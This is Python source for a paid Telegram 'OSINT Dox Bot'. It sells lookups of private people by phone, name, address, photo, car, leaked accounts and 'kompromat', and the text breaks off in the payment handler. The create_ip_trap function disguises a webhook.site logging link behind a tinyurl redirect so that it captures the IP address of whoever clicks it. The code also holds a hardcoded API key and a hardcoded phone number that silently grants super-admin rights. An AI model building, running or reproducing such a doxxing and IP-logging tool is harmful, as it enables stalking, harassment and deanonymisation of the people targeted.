"""
OSINT Dox Bot — Python / aiogram 3
Все функции: IP, телефон, ФИО, фото, адрес, компромат,
email, ник, WHOIS, жильё, утечки, паспорт, авто, Telegram,
обратный поиск по фото, SpiderFoot, IP-ловушка, Telegram Stars
"""

import asyncio, hashlib, json, os, re, sqlite3, subprocess, sys, time
from pathlib import Path
from typing import Optional

import aiohttp
import aiosqlite
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    CallbackQuery, Contact, InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, LabeledPrice, Message, PreCheckoutQuery,
    ReplyKeyboardMarkup, ReplyKeyboardRemove
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv

load_dotenv()

# ─── Конфигурация ─────────────────────────────────────────────────────────────
BOT_TOKEN     = os.getenv("BOT_TOKEN", "")
ADMIN_ID      = int(os.getenv("ADMIN_ID", "0"))
SEARCHAPI_KEY = os.getenv("SEARCHAPI_KEY", "3U2BbwQzCxKvRzeaAATjeRz6")
NUMVERIFY_KEY = os.getenv("NUMVERIFY_API_KEY", "demo")
GOOGLE_CX     = os.getenv("GOOGLE_CX", "")
DB_PATH       = "database.sqlite"

if not BOT_TOKEN:
    print("❌  BOT_TOKEN не указан в .env файле")
    sys.exit(1)

bot = Bot(token=BOT_TOKEN, default=None)
dp  = Dispatcher()

# Стоимость запросов
COSTS = {
    "ip_lookup": 5, "phone_lookup": 10, "person_search": 15,
    "photo_search": 10, "address_search": 15, "kompromat": 20,
    "email_search": 10, "username_search": 10, "whois_lookup": 5,
    "reverse_image": 25, "telegram_lookup": 10, "car_lookup": 15,
    "connections": 20, "doc_search": 20, "phone_to_ip": 20,
    "housing_search": 25, "deep_leaks": 25, "spiderfoot": 30,
    "full_dossier": 45,
}

STAR_PACKAGES = [
    ("pay_10", 10), ("pay_25", 25), ("pay_50", 50),
    ("pay_100", 100), ("pay_250", 250), ("pay_500", 500),
]

# Состояния пользователей
user_states: dict[int, dict] = {}

# ─── База данных ───────────────────────────────────────────────────────────────
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER UNIQUE,
                phone TEXT,
                stars INTEGER DEFAULT 0,
                allowed BOOLEAN DEFAULT 0,
                banned BOOLEAN DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS admins (
                telegram_id INTEGER UNIQUE,
                is_super BOOLEAN DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER, type TEXT, query TEXT,
                cost INTEGER, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS ip_traps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER, token TEXT UNIQUE,
                short_url TEXT, target_info TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
        """)
        # Добавить ADMIN_ID как супер-администратора если таблица пуста
        row = await db.execute_fetchall("SELECT COUNT(*) FROM admins")
        if row[0][0] == 0 and ADMIN_ID:
            await db.execute(
                "INSERT OR REPLACE INTO admins (telegram_id, is_super) VALUES (?, 1)", (ADMIN_ID,)
            )
        await db.commit()


async def get_user(telegram_id: int) -> Optional[dict]:
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def get_admin(telegram_id: int) -> Optional[dict]:
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM admins WHERE telegram_id = ?", (telegram_id,)) as cur:
            row = await cur.fetchone()
            return dict(row) if row else None


async def update_stars(telegram_id: int, delta: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET stars = stars + ? WHERE telegram_id = ?", (delta, telegram_id)
        )
        await db.commit()


async def log_request(user_id: int, req_type: str, query: str, cost: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO requests (user_id, type, query, cost) VALUES (?, ?, ?, ?)",
            (user_id, req_type, query, cost)
        )
        await db.commit()


async def notify_admins(text: str, reply_markup=None):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT telegram_id FROM admins") as cur:
            rows = await cur.fetchall()
    for (admin_id,) in rows:
        try:
            await bot.send_message(admin_id, text, parse_mode=ParseMode.HTML,
                                   reply_markup=reply_markup)
        except Exception:
            pass


# ─── Клавиатуры ────────────────────────────────────────────────────────────────
def main_menu() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="📋 Полное досье", callback_data="full_dossier"))
    b.row(InlineKeyboardButton(text="🌐 IP-адрес",    callback_data="ip_lookup"),
          InlineKeyboardButton(text="📞 Телефон",     callback_data="phone_lookup"))
    b.row(InlineKeyboardButton(text="👤 ФИО",         callback_data="person_search"),
          InlineKeyboardButton(text="📸 Фото",        callback_data="photo_search"))
    b.row(InlineKeyboardButton(text="🏠 Адрес",       callback_data="address_search"),
          InlineKeyboardButton(text="🕵️ Компромат",  callback_data="kompromat"))
    b.row(InlineKeyboardButton(text="📧 Email",       callback_data="email_search"),
          InlineKeyboardButton(text="👾 Ник",         callback_data="username_search"))
    b.row(InlineKeyboardButton(text="🔍 WHOIS",       callback_data="whois_lookup"),
          InlineKeyboardButton(text="✈️ Telegram",   callback_data="telegram_lookup"))
    b.row(InlineKeyboardButton(text="📷 Поиск по фото",   callback_data="reverse_image"),
          InlineKeyboardButton(text="🚗 Пробив авто",     callback_data="car_lookup"))
    b.row(InlineKeyboardButton(text="🔗 Связи/окружение", callback_data="connections"),
          InlineKeyboardButton(text="📄 Документы",       callback_data="doc_search"))
    b.row(InlineKeyboardButton(text="🌍 IP по телефону",        callback_data="phone_to_ip"),
          InlineKeyboardButton(text="🏘 Жильё",                callback_data="housing_search"))
    b.row(InlineKeyboardButton(text="🔓 Утечки ВК/Яндекс/Mail", callback_data="deep_leaks"))
    b.row(InlineKeyboardButton(text="🕷 SpiderFoot — глубокий скан", callback_data="spiderfoot"))
    b.row(InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars"),
          InlineKeyboardButton(text="💰 Баланс",        callback_data="show_balance"))
    b.row(InlineKeyboardButton(text="📜 История",       callback_data="show_history"))
    return b.as_markup()


def admin_menu() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="📋 Ожидающие",        callback_data="adm_pending"))
    b.row(InlineKeyboardButton(text="👥 Пользователи",     callback_data="adm_users"))
    b.row(InlineKeyboardButton(text="👮 Администраторы",   callback_data="adm_admins"))
    b.row(InlineKeyboardButton(text="➕ Назначить админа", callback_data="adm_make_admin"))
    b.row(InlineKeyboardButton(text="📊 Статистика",       callback_data="adm_stats"))
    b.row(InlineKeyboardButton(text="📢 Рассылка",         callback_data="adm_broadcast"))
    return b.as_markup()


def stars_menu() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="10 ⭐",  callback_data="pay_10"),
          InlineKeyboardButton(text="25 ⭐",  callback_data="pay_25"))
    b.row(InlineKeyboardButton(text="50 ⭐",  callback_data="pay_50"),
          InlineKeyboardButton(text="100 ⭐", callback_data="pay_100"))
    b.row(InlineKeyboardButton(text="250 ⭐", callback_data="pay_250"),
          InlineKeyboardButton(text="500 ⭐", callback_data="pay_500"))
    b.row(InlineKeyboardButton(text="◀️ Назад", callback_data="back_menu"))
    return b.as_markup()


# ─── HTTP помощники ────────────────────────────────────────────────────────────
async def http_get(url: str, params: dict = None, timeout: int = 15) -> Optional[dict]:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, params=params, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                if r.content_type == "application/json" or "json" in r.content_type:
                    return await r.json()
                text = await r.text()
                return {"_text": text}
    except Exception:
        return None


async def http_post(url: str, data: dict = None, json_data: dict = None, timeout: int = 15) -> Optional[dict]:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, data=data, json=json_data,
                              timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                return await r.json()
    except Exception:
        return None


async def google_search(query: str, engine: str = "google", num: int = 10, extra: dict = None) -> dict:
    params = {
        "engine": engine, "q": query, "gl": "ru", "hl": "ru",
        "num": num, "api_key": SEARCHAPI_KEY,
    }
    if GOOGLE_CX and engine == "google":
        params["cx"] = GOOGLE_CX
    if extra:
        params.update(extra)
    result = await http_get("https://www.searchapi.io/api/v1/search", params=params, timeout=25)
    return result or {}


async def shodan_lookup(ip: str) -> Optional[dict]:
    return await http_get(f"https://internetdb.shodan.io/{ip}", timeout=8)


async def ipinfo_lookup(ip: str) -> Optional[dict]:
    return await http_get(f"https://ipinfo.io/{ip}/json", timeout=8)


async def reverse_ip_lookup(ip: str) -> list:
    r = await http_get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=12)
    if not r or r.get("_text", "").startswith("error"):
        return []
    return [l for l in r.get("_text", "").split("\n") if l][:30]


async def dns_lookup(domain: str) -> Optional[str]:
    r = await http_get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
    if not r or r.get("_text", "").startswith("error"):
        return None
    return r.get("_text", "").strip()


async def crtsh_lookup(domain: str) -> list:
    r = await http_get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=20)
    if not r:
        return []
    names: set = set()
    for cert in (r if isinstance(r, list) else []):
        for n in cert.get("name_value", "").split("\n"):
            clean = n.strip().replace("*.", "")
            if clean and "." in clean and clean.endswith(domain):
                names.add(clean)
    return sorted(names)[:40]


async def wayback_lookup(url: str) -> Optional[dict]:
    r = await http_get(f"https://archive.org/wayback/available?url={url}", timeout=8)
    return r.get("archived_snapshots", {}).get("closest") if r else None


async def github_user_lookup(username: str) -> Optional[dict]:
    return await http_get(
        f"https://api.github.com/users/{username}",
        timeout=8
    )


async def leakcheck_public(query: str) -> Optional[dict]:
    from urllib.parse import quote
    return await http_get(
        f"https://leakcheck.io/api/public?check={quote(query)}", timeout=10
    )


async def create_ip_trap(redirect_url: str = "https://vk.com") -> Optional[dict]:
    resp = await http_post("https://webhook.site/token", json_data={
        "default_status": 302, "default_content": "",
        "default_headers": {"Location": redirect_url},
    }, timeout=10)
    if not resp or "uuid" not in resp:
        return None
    token = resp["uuid"]
    track_url = f"https://webhook.site/{token}"
    short_url = track_url
    r = await http_get(f"https://tinyurl.com/api-create.php?url={track_url}", timeout=5)
    if r and r.get("_text", "").startswith("http"):
        short_url = r["_text"].strip()
    return {"token": token, "track_url": track_url, "short_url": short_url}


async def check_trap(token: str) -> list:
    r = await http_get(
        f"https://webhook.site/token/{token}/requests?sorting=newest&per_page=20",
        timeout=10
    )
    return r.get("data", []) if r else []


# ─── Regex ─────────────────────────────────────────────────────────────────────
RE_IP     = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")
RE_PHONE  = re.compile(r"^[\+7-8][\d\s\-\(\)]{9,15}$")
RE_EMAIL  = re.compile(r"^[^\s@]+@[^\s@]+\.[^\s@]+$")
RE_DOMAIN = re.compile(r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$")


def extract_contacts(text: str) -> dict:
    phones    = list(set(re.findall(r"(?:\+7|8)[\s\-\(]?\d{3}[\s\-\)]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}", text)))[:5]
    emails    = list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", text)))[:5]
    addresses = list(set(re.findall(
        r"(?:г\.|город|ул\.|улица|пр\.|проспект|пер\.|д\.\s*\d+)[^,\n]{3,60}", text, re.I
    )))[:5]
    return {"phones": phones, "emails": emails, "addresses": addresses}


# ─── Форматирование Knowledge Graph ──────────────────────────────────────────
KG_SKIP = {"kgmid", "knowledge_graph_type", "source", "profiles",
           "people_also_search_for", "people_also_search_for_link", "images"}
KG_ICONS = {
    "дата": "🎂", "рождения": "🎂", "место": "📍", "смерть": "✝️",
    "дети": "👶", "супруг": "💍", "образование": "🎓", "родител": "👪",
    "должност": "💼", "звание": "🏅", "партия": "🏛", "рост": "📏",
    "гражданство": "🌍", "срок": "📅", "профессия": "💼", "сайт": "🌐"
}


def render_kg(kg: dict) -> Optional[str]:
    if not kg or "title" not in kg:
        return None
    lines = [f"👤 <b>{kg['title']}</b>"]
    if kg.get("type"):
        lines.append(f"📂 {kg['type']}")
    if kg.get("description"):
        lines.append(f"\n📝 {kg['description']}\n")
    for key, val in kg.items():
        if key in KG_SKIP or key in ("title", "type", "description"):
            continue
        if key.endswith("_links") or key.endswith("_link"):
            continue
        if not isinstance(val, str):
            continue
        lk = key.lower()
        icon = next((v for k, v in KG_ICONS.items() if k in lk), "▪️")
        lines.append(f"{icon} <b>{key.replace('_', ' ')}:</b> {val}")
    return "\n".join(lines)


# ─── Отправить фото с fallback ─────────────────────────────────────────────────
async def send_photo_safe(message: Message, caption: str, *urls) -> bool:
    for url in urls:
        if not url or url.startswith("data:"):
            continue
        try:
            await message.answer_photo(url, caption=caption, parse_mode=ParseMode.HTML)
            return True
        except Exception:
            pass
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=10),
                                 headers={"User-Agent": "Mozilla/5.0"}) as r:
                    ct = r.headers.get("Content-Type", "")
                    if "image" in ct:
                        data = await r.read()
                        from aiogram.types import BufferedInputFile
                        await message.answer_photo(
                            BufferedInputFile(data, filename="photo.jpg"),
                            caption=caption, parse_mode=ParseMode.HTML
                        )
                        return True
        except Exception:
            pass
    return False


# ─── Вспомогательные функции проверок ─────────────────────────────────────────
async def check_auth(message: Message) -> Optional[dict]:
    user = await get_user(message.from_user.id)
    if not user or user.get("banned"):
        await message.answer("⛔ Доступ запрещён.")
        return None
    if not user.get("allowed"):
        await message.answer("⏳ Ожидайте подтверждения администратора.")
        return None
    return user


async def deduct_and_proceed(message: Message, action: str, query: str) -> bool:
    user = await check_auth(message)
    if not user:
        return False
    admin = await get_admin(message.from_user.id)
    cost = COSTS.get(action, 0)
    if not admin and user["stars"] < cost:
        needed = cost - user["stars"]
        pkg = next((p for p in STAR_PACKAGES if p[1] >= needed), STAR_PACKAGES[-1])
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text=f"⭐ Купить {pkg[1]} звёзд", callback_data=pkg[0]))
        kb.row(InlineKeyboardButton(text="💰 Все пакеты", callback_data="buy_stars"))
        await message.answer(
            f"❌ <b>Недостаточно звёзд</b>\nНужно: <b>{cost} ⭐</b>  |  У вас: <b>{user['stars']} ⭐</b>",
            parse_mode=ParseMode.HTML, reply_markup=kb.as_markup()
        )
        return False
    if not admin:
        await update_stars(message.from_user.id, -cost)
    await log_request(message.from_user.id, action, query, cost)
    bal_info = "👑 Админ — бесплатно" if admin else f"Остаток: {user['stars'] - cost} ⭐"
    await message.answer(f"⏳ Выполняю поиск...\n<i>{bal_info}</i>", parse_mode=ParseMode.HTML)
    return True


# ════════════════════════════════════════════════════════════════
#   HANDLERS
# ════════════════════════════════════════════════════════════════

@dp.message(CommandStart())
async def cmd_start(message: Message):
    uid  = message.from_user.id
    name = message.from_user.first_name
    user = await get_user(uid)

    if not user:
        kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📱 Отправить номер телефона", request_contact=True)]],
            resize_keyboard=True
        )
        await message.answer(
            f"👋 <b>Привет, {name}!</b>\n\n"
            "🤖 <b>OSINT Dox Bot</b> — инструмент разведки по открытым источникам.\n\n"
            "📱 Отправьте свой номер для регистрации:",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
    elif user.get("banned"):
        await message.answer("⛔ Ваш аккаунт заблокирован.")
    elif not user.get("allowed"):
        await message.answer("⏳ Ваш аккаунт ожидает подтверждения администратора.")
    else:
        await message.answer(
            f"🎉 <b>С возвращением, {name}!</b>\n💰 Баланс: <b>{user['stars']} ⭐</b>",
            parse_mode=ParseMode.HTML, reply_markup=main_menu()
        )


@dp.message(F.contact)
async def handle_contact(message: Message):
    contact = message.contact
    if contact.user_id != message.from_user.id:
        return await message.answer("Пожалуйста, отправьте свой контакт.")

    uid   = message.from_user.id
    phone = contact.phone_number
    user  = await get_user(uid)

    if user and user.get("allowed") and not user.get("banned"):
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET phone = ? WHERE telegram_id = ?", (phone, uid))
            await db.commit()
        await message.answer("✅ Вы уже подтверждены!", reply_markup=ReplyKeyboardRemove())
        await message.answer("Главное меню:", reply_markup=main_menu())
        return

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO users (telegram_id, phone, stars, allowed, banned) VALUES (?, ?, 0, 0, 0) "
            "ON CONFLICT(telegram_id) DO UPDATE SET phone = excluded.phone",
            (uid, phone)
        )
        await db.commit()

    await message.answer("✅ Номер сохранён. Ожидайте подтверждения.", reply_markup=ReplyKeyboardRemove())

    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text=f"✅ Подтвердить {uid}", callback_data=f"approve_{uid}"),
        InlineKeyboardButton(text=f"🚫 Отклонить {uid}",  callback_data=f"reject_{uid}")
    )
    await notify_admins(
        f"🆕 <b>Новый пользователь</b>\n"
        f"👤 {message.from_user.first_name} (@{message.from_user.username or '—'})\n"
        f"📱 {phone}  🆔 <code>{uid}</code>",
        reply_markup=kb.as_markup()
    )

    if phone in ("79282953494", "+79282953494"):
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT OR REPLACE INTO admins (telegram_id, is_super) VALUES (?, 1)", (uid,))
            await db.execute("UPDATE users SET allowed = 1 WHERE telegram_id = ?", (uid,))
            await db.commit()
        await bot.send_message(uid, "🔐 Вы автоматически добавлены как администратор.")


# ─── Команды ──────────────────────────────────────────────────────────────────
@dp.message(Command("menu"))
async def cmd_menu(message: Message):
    await message.answer("📋 Главное меню:", reply_markup=main_menu())


@dp.message(Command("cancel"))
async def cmd_cancel(message: Message):
    user_states.pop(message.from_user.id, None)
    await message.answer("❌ Действие отменено.", reply_markup=main_menu())


@dp.message(Command("balance"))
async def cmd_balance(message: Message):
    user = await get_user(message.from_user.id)
    if not user:
        return await message.answer("Пользователь не найден.")
    await message.answer(f"💰 Ваш баланс: <b>{user['stars']} ⭐</b>", parse_mode=ParseMode.HTML)


@dp.message(Command("history"))
async def cmd_history(message: Message):
    await show_history(message, message.from_user.id)


async def show_history(message: Message, uid: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT type, query, cost, created_at FROM requests WHERE user_id = ? ORDER BY id DESC LIMIT 10",
            (uid,)
        ) as cur:
            rows = await cur.fetchall()
    if not rows:
        return await message.answer("📜 История запросов пуста.")
    msg = "📜 <b>История запросов (последние 10):</b>\n\n"
    for i, r in enumerate(rows, 1):
        msg += f"{i}. <code>{r['type']}</code>  <code>{r['query'][:40]}</code>  {r['cost']}⭐\n<i>{r['created_at'][:16]}</i>\n\n"
    await message.answer(msg, parse_mode=ParseMode.HTML)


@dp.message(Command("check"))
async def cmd_check(message: Message):
    parts = message.text.split()
    if len(parts) < 2:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT token, short_url, target_info, created_at FROM ip_traps WHERE user_id = ? ORDER BY id DESC LIMIT 5",
                (message.from_user.id,)
            ) as cur:
                rows = await cur.fetchall()
        if not rows:
            return await message.answer("У вас нет активных ловушек.\n\nСоздайте через 🌍 IP по номеру телефона")
        text = "🪤 <b>Ваши ловушки:</b>\n\n"
        for token, short_url, target, created in rows:
            text += f"📱 {target or '—'}\n🔗 {short_url}\n🔑 <code>{token}</code>\n/check {token}\n\n"
        return await message.answer(text, parse_mode=ParseMode.HTML)
    await do_check_trap(message, parts[1])


# ─── Адмнистраторские команды ─────────────────────────────────────────────────
async def require_admin(message: Message) -> bool:
    admin = await get_admin(message.from_user.id)
    if not admin:
        await message.answer("⛔ У вас нет прав администратора.")
        return False
    return True


async def require_super(message: Message) -> bool:
    admin = await get_admin(message.from_user.id)
    if not admin or not admin.get("is_super"):
        await message.answer("⛔ Только супер-администратор может выполнить это действие.")
        return False
    return True


@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if not await require_admin(message):
        return
    await message.answer("🔧 Панель администратора:", reply_markup=admin_menu())


@dp.message(Command("allow_user"))
async def cmd_allow_user(message: Message):
    if not await require_admin(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: /allow_user <telegram_id>")
    await do_approve_user(message, int(parts[1]))


@dp.message(Command("add_stars"))
async def cmd_add_stars(message: Message):
    if not await require_admin(message):
        return
    parts = message.text.split()
    if len(parts) < 3:
        return await message.answer("Использование: /add_stars <id> <количество>")
    tid, amt = int(parts[1]), int(parts[2])
    await update_stars(tid, amt)
    await message.answer(f"✅ Начислено {amt} ⭐ пользователю {tid}.")
    try:
        await bot.send_message(tid, f"⭐ Вам начислено <b>{amt}</b> звёзд!", parse_mode=ParseMode.HTML)
    except Exception:
        pass


@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if not await require_admin(message):
        return
    tid = int(message.text.split()[1]) if len(message.text.split()) > 1 else None
    if not tid:
        return await message.answer("Использование: /ban <id>")
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET banned = 1 WHERE telegram_id = ?", (tid,))
        await db.commit()
    await message.answer(f"🚫 Пользователь {tid} заблокирован.")


@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    if not await require_admin(message):
        return
    tid = int(message.text.split()[1]) if len(message.text.split()) > 1 else None
    if not tid:
        return await message.answer("Использование: /unban <id>")
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET banned = 0 WHERE telegram_id = ?", (tid,))
        await db.commit()
    await message.answer(f"✅ Пользователь {tid} разблокирован.")


@dp.message(Command("make_admin"))
async def cmd_make_admin(message: Message):
    if not await require_admin(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: /make_admin <telegram_id>")
    tid  = int(parts[1])
    user = await get_user(tid)
    if not user:
        return await message.answer(f"❌ Пользователь <code>{tid}</code> не найден.", parse_mode=ParseMode.HTML)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO admins (telegram_id, is_super) VALUES (?, 0)", (tid,))
        await db.execute("UPDATE users SET allowed = 1 WHERE telegram_id = ?", (tid,))
        await db.commit()
    await message.answer(f"✅ Пользователь <code>{tid}</code> назначен администратором.", parse_mode=ParseMode.HTML)
    try:
        await bot.send_message(tid, "🔐 <b>Вам выданы права администратора!</b>", parse_mode=ParseMode.HTML, reply_markup=admin_menu())
    except Exception:
        pass


@dp.message(Command("remove_admin"))
async def cmd_remove_admin(message: Message):
    if not await require_admin(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: /remove_admin <telegram_id>")
    tid = int(parts[1])
    if tid == message.from_user.id:
        return await message.answer("❌ Нельзя снять права у самого себя.")
    admin = await get_admin(tid)
    if not admin:
        return await message.answer("❌ Пользователь не является администратором.")
    if admin.get("is_super"):
        return await message.answer("❌ Нельзя снять права у супер-администратора.")
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM admins WHERE telegram_id = ?", (tid,))
        await db.commit()
    await message.answer(f"✅ Права администратора у <code>{tid}</code> сняты.", parse_mode=ParseMode.HTML)


@dp.message(Command("make_super"))
async def cmd_make_super(message: Message):
    if not await require_super(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: /make_super <telegram_id>")
    tid  = int(parts[1])
    user = await get_user(tid)
    if not user:
        return await message.answer(f"❌ Пользователь <code>{tid}</code> не найден.", parse_mode=ParseMode.HTML)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO admins (telegram_id, is_super) VALUES (?, 1)", (tid,))
        await db.execute("UPDATE users SET allowed = 1 WHERE telegram_id = ?", (tid,))
        await db.commit()
    await message.answer(f"👑 <code>{tid}</code> назначен супер-администратором.", parse_mode=ParseMode.HTML)


@dp.message(Command("broadcast"))
async def cmd_broadcast(message: Message):
    if not await require_admin(message):
        return
    text = message.text.replace("/broadcast", "").strip()
    if not text:
        return await message.answer("Использование: /broadcast <сообщение>")
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT telegram_id FROM users WHERE allowed=1 AND banned=0") as cur:
            rows = await cur.fetchall()
    ok = fail = 0
    for (uid,) in rows:
        try:
            await bot.send_message(uid, f"📢 <b>Сообщение от администратора:</b>\n\n{text}", parse_mode=ParseMode.HTML)
            ok += 1
        except Exception:
            fail += 1
    await message.answer(f"📢 Рассылка завершена.\n✅ {ok}  ❌ {fail}")


@dp.message(Command("list_admins"))
async def cmd_list_admins(message: Message):
    if not await require_admin(message):
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT a.telegram_id, a.is_super, u.phone FROM admins a LEFT JOIN users u ON a.telegram_id=u.telegram_id ORDER BY a.is_super DESC"
        ) as cur:
            rows = await cur.fetchall()
    if not rows:
        return await message.answer("Нет администраторов.")
    msg = "👮 <b>Администраторы:</b>\n\n"
    for tid, is_super, phone in rows:
        role = "👑 Супер-админ" if is_super else "🔐 Админ"
        msg += f"{role}\n🆔 <code>{tid}</code>  📱 {phone or '—'}\n\n"
    await message.answer(msg, parse_mode=ParseMode.HTML)


# ─── Inline callback обработчики ──────────────────────────────────────────────
async def do_approve_user(ctx, target_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET allowed = 1 WHERE telegram_id = ?", (target_id,))
        await db.commit()
    text = f"✅ Пользователь <code>{target_id}</code> подтверждён."
    if isinstance(ctx, Message):
        await ctx.answer(text, parse_mode=ParseMode.HTML)
    else:
        await ctx.message.answer(text, parse_mode=ParseMode.HTML)
    try:
        await bot.send_message(target_id, "✅ <b>Доступ открыт!</b> Выберите действие:",
                               parse_mode=ParseMode.HTML, reply_markup=main_menu())
    except Exception:
        pass


@dp.callback_query(F.data.startswith("approve_"))
async def cb_approve(cb: CallbackQuery):
    await cb.answer()
    admin = await get_admin(cb.from_user.id)
    if not admin:
        return await cb.message.answer("⛔ Нет прав.")
    tid = int(cb.data.split("_")[1])
    await do_approve_user(cb, tid)
    await cb.message.edit_reply_markup(reply_markup=None)


@dp.callback_query(F.data.startswith("reject_"))
async def cb_reject(cb: CallbackQuery):
    await cb.answer()
    admin = await get_admin(cb.from_user.id)
    if not admin:
        return
    tid = int(cb.data.split("_")[1])
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM users WHERE telegram_id = ?", (tid,))
        await db.commit()
    await cb.message.edit_text(f"❌ Пользователь {tid} отклонён.")
    try:
        await bot.send_message(tid, "❌ Ваш запрос на доступ отклонён.")
    except Exception:
        pass


@dp.callback_query(F.data == "back_menu")
async def cb_back_menu(cb: CallbackQuery):
    await cb.answer()
    await cb.message.edit_text("📋 Главное меню:", reply_markup=main_menu())


@dp.callback_query(F.data == "show_balance")
async def cb_balance(cb: CallbackQuery):
    await cb.answer()
    uid   = cb.from_user.id
    user  = await get_user(uid)
    admin = await get_admin(uid)
    if not user:
        return await cb.message.answer("Пользователь не найден.")
    costs_text = "\n".join(f"{v} ⭐ — {k.replace('_', ' ')}" for k, v in COSTS.items())
    bal = "👑 <b>Администратор — неограниченный доступ</b>" if admin else f"💰 <b>Ваш баланс: {user['stars']} ⭐</b>"
    kb  = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars"))
    await cb.message.answer(
        f"{bal}\n\n💳 <b>Пополнение:</b> Telegram Stars (1 Star = 1 ⭐)\n\n<b>Стоимость:</b>\n{costs_text}",
        parse_mode=ParseMode.HTML, reply_markup=kb.as_markup()
    )


@dp.callback_query(F.data == "show_history")
async def cb_history(cb: CallbackQuery):
    await cb.answer()
    await show_history(cb.message, cb.from_user.id)


@dp.callback_query(F.data == "buy_stars")
async def cb_buy_stars(cb: CallbackQuery):
    await cb.answer()
    await cb.message.answer(
        "⭐ <b>Купить звёзды</b>\n\n1 Telegram Star = 1 звезда в боте\nОплата мгновенная и автоматическая.\n\nВыберите пакет:",
        parse_mode=ParseMode.HTML, reply_markup=stars_menu()
    )


@dp.callback_query(F.data.in_({p[0] for p in STAR_PACKAGES}))
async def cb_pay_package(cb: CallbackQuery):
    await cb.answer()
    stars = dict(STAR_PACKAGES)[cb.data]
    await cb.message.answer_invoice(
        title=f"{stars} звёзд для OSINT-бота",
        description=f"Пополнение баланса: {stars} ⭐. Начислятся автоматически после оплаты.",
        payload=json.dumps({"user_id": cb.from_user.id, "stars": stars}),
        currency="XTR",
        prices=[LabeledPrice(label=f"{stars} ⭐", amount=stars)],
        provider_token="",
    )


@dp.pre_checkout_query()
async def pre_checkout(pcq: PreCheckoutQuery):
    await pcq.answer(ok=True)


@dp.message(F.successful_payment)
async def successful_payment(message: Message):
    payment = message.successful_payment
    payload = json.loads(payment.invoice_payload)
    uid, stars = payload["user_id"], payload["stars"]
    await update_stars(uid, stars)
    user = await get_user(uid)
    await message.answer(
